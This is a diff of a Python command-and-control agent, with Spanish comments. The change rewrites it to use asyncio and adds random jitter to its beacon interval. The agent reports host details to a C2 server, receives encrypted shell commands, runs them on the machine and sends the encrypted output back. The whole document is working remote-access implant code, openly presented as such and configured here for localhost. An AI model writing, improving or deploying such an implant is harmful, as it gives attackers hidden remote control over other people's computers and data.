@@ -1,8 +1,9 @@
-import time, requests, os, platform, subprocess, socket, cipher
+import asyncio, aiohttp, random, os, platform, subprocess, socket, cipher
 
 # Configuración de red del Servidor C2
 C2_URL = "http://localhost:8080"
 INTERVALO_BEACON = 5
+JITTER_PORCENTAJE = 0.2
 
 def get_system_info():
     try:
@@ -23,59 +24,79 @@ def get_system_info():
 
     return name, ip, os_type
 
-def main():
+async def execute_system_command(command: str) -> str:
+    """Executa un comando de forma asíncrona sin bloquear el bucle de red."""
+    try:
+        # Ejecución asíncrona nativa usando el subsistema de asyncio
+        process = await asyncio.create_subprocess_shell(
+            command,
+            stdout=subprocess.PIPE,
+            stderr=subprocess.PIPE
+        )
+        
+        stdout, stderr = await process.communicate()
+        
+        output = stdout.decode(errors='ignore') if stdout else ""
+        if stderr:
+            output += f"\n[ERROR]: {stderr.decode(errors='ignore')}"
+            
+        if not output.strip():
+            output = "[+] Comando ejecutado con éxito (Sin salida de texto)."
+        return output
+        
+    except Exception as e:
+        return f"[!] Fallo crítico al ejecutar el comando: {str(e)}"
+
+async def main():
     agent_name, agent_ip, agent_os = get_system_info()
     print(f"[*] Iniciando Agente C2: {agent_name}")
     print(f"[*] Conectando a {C2_URL} cada {INTERVALO_BEACON} segundos...")
 
-    while True:
-        command = None
-        try:
-            # 1. Enviar el BEACON
-            params = {"name": agent_name, "ip": agent_ip, "os_type": agent_os}
-            response = requests.get(f"{C2_URL}/api/beacon", params=params, timeout=4)
+    timeout_config = aiohttp.ClientTimeout(total=6)
 
-            if response.status_code == 200:
-                encrypted_response = response.json()
+    async with aiohttp.ClientSession(timeout=timeout_config) as session:
+        while True:
+            command = None
+            try:
+                # 1. Enviar el BEACON de forma asíncrona
+                params = {"name": agent_name, "ip": agent_ip, "os_type": agent_os}
+                async with session.get(f"{C2_URL}/api/beacon", params=params) as response:
+                    
+                    if response.status == 200:
+                        encrypted_response = await response.json()
 
-                if "ciphertext" in encrypted_response:
-                    data = cipher.decrypt_data(encrypted_response)
-                    command = data.get("command")
+                        if "ciphertext" in encrypted_response:
+                            # Descifrado empleando tu módulo externo
+                            data = cipher.decrypt_data(encrypted_response, agent_name=agent_name)
+                            command = data.get("command")
 
-                # 2. Si hay un comando en cola, lo ejecutamos en el sistema operativo
-                if command:
-                    print(f"[+] Comando cifrado recibido y descifrado: {command}")
+                        # 2. Si se recibe un comando, se ejecuta sin congelar la comunicación
+                        if command:
+                            print(f"[+] Comando recibido: {command}")
+                            output = await execute_system_command(command)
 
-                    # Ejecución nativa usando subprocess de Python (captura stdout y stderr)
-                    # Usamos shell=True para permitir comandos directos de terminal
-                    process = subprocess.run(
-                        command,
-                        shell=True,
-                        capture_output=True,
-                        text=True,
-                        errors='ignore'
-                    )
+                            raw_payload = {"name": agent_name, "result": output}
+                            encrypted_payload = cipher.encrypt_data(raw_payload, agent_name=agent_name)
 
-                    # Combinamos la salida estándar y la de errores
-                    output = process.stdout if process.stdout else ""
-                    if process.stderr:
-                        output += f"\n[ERROR]: {process.stderr}"
-                    if not output.strip():
-                        output = "[+] Comando ejecutado con éxito (Sin salida de texto)."
+                            url_resultado = f"{C2_URL}/api/result?name={agent_name}"
 
-                    raw_payload = {"name": agent_name, "result": output}
-                    encrypted_payload = cipher.encrypt_data(raw_payload)
+                            # 3. Reportar los resultados devueltos por el proceso
+                            async with session.post(url_resultado, json=encrypted_payload) as post_resp:
+                                if post_resp.status == 200:
+                                    print("[*] Resultado enviado exitosamente a la GUI.")
+                                else:
+                                    print(f"[!] El servidor respondió con estado: {post_resp.status}")
 
-                    # 3. Devolver el resultado real de tu máquina al servidor web del C2
-                    requests.post(f"{C2_URL}/api/result", json=encrypted_payload, timeout=4)
-                    print("[*] Resultado cifrado con AES-GCM enviado a la GUI.")
+            except aiohttp.ClientConnectorError:
+                print("[!] Servidor C2 offline o inaccesible. Reintentando...")
+            except asyncio.TimeoutError:
+                print("[!] Tiempo de espera agotado en la comunicación. Reintentando...")
+            except Exception as e:
+                print(f"[!] Error inesperado en el bucle del agente: {e}")
 
-        except requests.exceptions.ConnectionError:
-            print("[!] Servidor C2 offline. Reintentando...")
-        except Exception as e:
-            print(f"[!] Error inesperado en el agente: {e}")
-
-        time.sleep(INTERVALO_BEACON)
+            # Calcular variación aleatoria (Jitter) para suavizar la carga del servidor
+            actual_sleep = INTERVALO_BEACON + random.uniform(-INTERVALO_BEACON * JITTER_PORCENTAJE, INTERVALO_BEACON * JITTER_PORCENTAJE)
+            await asyncio.sleep(max(1, actual_sleep))
 
 if __name__ == "__main__":
-    main()
+    asyncio.run(main())
